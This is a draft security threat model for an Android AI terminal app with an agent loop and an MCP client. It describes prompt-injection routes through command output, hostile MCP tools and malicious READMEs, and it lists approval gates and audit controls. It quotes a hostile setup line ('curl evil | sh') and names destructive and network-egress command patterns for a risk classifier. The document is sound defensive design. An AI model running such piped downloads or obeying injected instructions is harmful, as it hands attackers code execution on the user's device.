# Threat Model — Zantor

**Version:** 0.1 (draft)
**Status:** Pre-implementation. Update whenever the architecture changes.
**Scope:** Android AI-powered terminal app (M2a–M4). Foreground-service terminal, AI command assistance, agent loop, MCP client, audit log. iOS, root/chroot mode, and Kali tooling are out of scope for this version.

---

## 1. Assets

| ID | Asset | Why it matters |
|----|-------|----------------|
| A1 | User files on device (termux-prefix home, shared storage if granted) | Theft/destruction is the primary damage scenario |
| A2 | Cloud LLM API keys (user-provided) | Theft → financial abuse of the user's account |
| A3 | Audit log integrity | Core product promise; must survive hostile device holders |
| A4 | Shell execution capability | An AI feature that runs arbitrary commands is itself an asset to abuse |
| A5 | Device identifiers / tokens (FCM, etc.) | Privacy and impersonation |
| A6 | On-device model files | Tampering could change model behavior |

## 2. Trust Boundaries

```
┌─────────────────────────────── device ───────────────────────────────┐
│  other apps  ──(TB4: Binder/intent surface)──▶  Zantor app          │
│                                                      │                │
│        shell executor (agent-spawned, same uid)      │                │
│                  ▲                                   │                │
│        TB2: agent loop → commands  (user approval gate)               │
│                  │                                   │                │
│  command output ─┴─ TB3: output → model context  (untrusted data)    │
└──────────────────────┬────────────────────────────────┬─────────────-┘
             TB1: HTTPS ▼ (prompts, API key)   TB5: HTTPS/SSE ▼ (tools, results)
                LLM provider (cloud)                 MCP servers
```

- **TB1** app ↔ cloud LLM provider: user prompts and command output leave the device.
- **TB2** agent loop → shell executor: model-proposed text becomes executed commands.
- **TB3** command/tool output → model context: attacker-controlled bytes enter the prompt.
- **TB4** other on-device apps ↔ app (intents, clipboard, Tasker plugin later).
- **TB5** app ↔ MCP servers: remote, user-allowlisted but still untrusted.

## 3. Attacker Types

| ID | Attacker | Capability |
|----|----------|------------|
| AT1 | **Malicious command output** (e.g. `curl` of an attacker page, `git log` of a hostile repo) | Injects text into TB3 attempting prompt injection |
| AT2 | **Hostile MCP server** (user added it, or a benign server was compromised) | Returns crafted tool results; offers malicious tool descriptions |
| AT3 | **Malicious repo / README** rendered or read in the shell | README-as-prompt-injection; also malicious install scripts the agent might run |
| AT4 | **Local malicious app** on the device | Sends crafted intents, races the clipboard, attempts to bind app services |
| AT5 | **Physical/device-integrity attacker** (rooted device, forensic access) | Reads/tampers local storage incl. audit log |
| AT6 | **Compromised model/provider** (out of our control) | Returns commands designed to exfiltrate |

## 4. STRIDE per Component

### 4.1 Shell Executor
| Threat | Detail | Mitigation |
|---|---|---|
| Elevation of privilege | Agent-spawned commands run with app uid | Agent confined to a restricted working directory; no ambient access to other apps' private dirs (Android sandbox helps) |
| Tampering | Command text edited between proposal and execution | Command shown verbatim at approval; hash of approved command recorded in audit log before exec |

### 4.2 Agent Loop
| Threat | Detail | Mitigation |
|---|---|---|
| Tampering / Repudiation | Model edits its own rules or forgets constraints | System prompt and rules immutable at runtime; no tool exists to modify them |
| Prompt injection (via TB3) | Output content instructs the agent | (C1) Narrow-untrusted gating — see §5 |
| Denial of service | Agent loops indefinitely | Step cap, token budget, user-visible kill switch |

### 4.3 Model Providers (TB1)
| Threat | Detail | Mitigation |
|---|---|---|
| Information disclosure | Sensitive cwd/files leak in prompts | Redaction pass on outbound context (paths, env values matching secret patterns) |
| Spoofing | Fake endpoint | TLS + user-configured endpoint only; no third-party proxies |

### 4.4 MCP Client (TB5)
| Threat | Detail | Mitigation |
|---|---|---|
| Spoofing | Impersonated server | HTTP/SSE only, TLS, user-allowlisted origins only |
| Tampering | Crafted tool results | Results pass through the untrusted-output gate (C1); tool *descriptions* shown to user on server add |
| Malicious tools | Server advertises harmful tools | Per-tool approval on first use; tool list frozen per session |

### 4.5 Audit Log
| Threat | Detail | Mitigation |
|---|---|---|
| Repudiation | User/attacker denies a command ran | Append-only, hash-chained entries |
| Tampering | **Hash chain alone proves order, not authenticity — an attacker with device access can rebuild an unsigned chain** | (C2) Periodic signed checkpoints with a key in Android Keystore; external export |
| Information disclosure | Secrets logged | Secret-pattern redaction before logging |

### 4.6 AI Command Bar (NL → command)
| Threat | Detail | Mitigation |
|---|---|---|
| Malicious repo README | "Run `curl evil | sh` for setup" → NL bar | Every generated command requires explicit confirmation; risk classifier annotation shown |
| Elevation of privilege | `su`/destructive commands | Deterministic rule-based classifier (not LLM) flags risk tier; destructive/network commands always require confirmation |

### 4.7 Inter-app Surface (TB4)
| Threat | Detail | Mitigation |
|---|---|---|
| Confused deputy | Another app triggers actions | Exported components minimal; any future Binder/AIDL exec surface requires signature-level permission and is deferred to v2 |
| Clipboard injection | Paste of hostile commands | Paste preview for multi-line input; bracketed-paste handling in the terminal |

## 5. Key Controls

- **(C1) Narrow-untrusted gating.** "Untrusted" output is defined *only* as: web content, files from outside the working directory, network responses, and MCP tool results. After the agent reads any untrusted output, **every subsequent command requires mandatory user approval** (no auto-chaining) in that session. Output from local, read-only commands (`ls`, `cat` inside the workdir, `git status`, …) may auto-chain — otherwise every step prompts and the feature is unusable. Model context treats all output as data, never instructions, as defense in depth — not as the primary control.
- **(C2) Audit log.** Append-only, hash-chained (each entry contains the previous entry's hash), secrets redacted before logging, and **periodic signed checkpoints anchored by a key in Android Keystore**, with export to an external location. Known limit: unsigned entries since the last checkpoint can be rebuilt by an attacker with device access; checkpoints bound that window.
- **(C3) Risk classifier.** Deterministic, rule-based (regex/AST over parsed commands), not an LLM. Categories: destructive (rm -rf, dd, mkfs), network egress (curl|sh patterns, nc), privilege escalation (su), persistence (crontab, boot scripts). Tiers drive confirmation UX.
- **(C4) Restricted working directory.** The agent operates in a dedicated directory; operations outside it require explicit approval.
- **(C5) Secrets handling.** API keys in Android Keystore–backed encrypted storage; redaction of secret-shaped values from prompts, logs, and scrollback export.

## 6. Residual Risks (accepted / documented honestly)

| Risk | Why residual |
|---|---|
| **Network egress allowlisting is best-effort.** Unrooted Android has no per-process iptables; a local VpnService proxy or proxy env vars can be bypassed by agent-spawned processes. | Either implement best-effort with clear docs, or defer to v2. **Decision deferred; this threat model carries the risk regardless.** |
| Unsigned audit-window tampering between checkpoints (C2). | Checkpoint cadence is a UX/battery tradeoff; external export mitigates. |
| Model hallucinates dangerous commands not caught by C3. | Confirmation UX is the last gate; user education in onboarding. |
| Root/forensic attacker (AT5) defeats most controls. | Documented as out of the Android security model's ability to prevent; Keystore + export reduce impact. |
| User approves something harmful. | We reduce surprise (verbatim command display, risk tier, injection warnings) but can't eliminate consent. |

## 7. Changelog

- 0.1 — Initial draft (M0), pre-implementation.
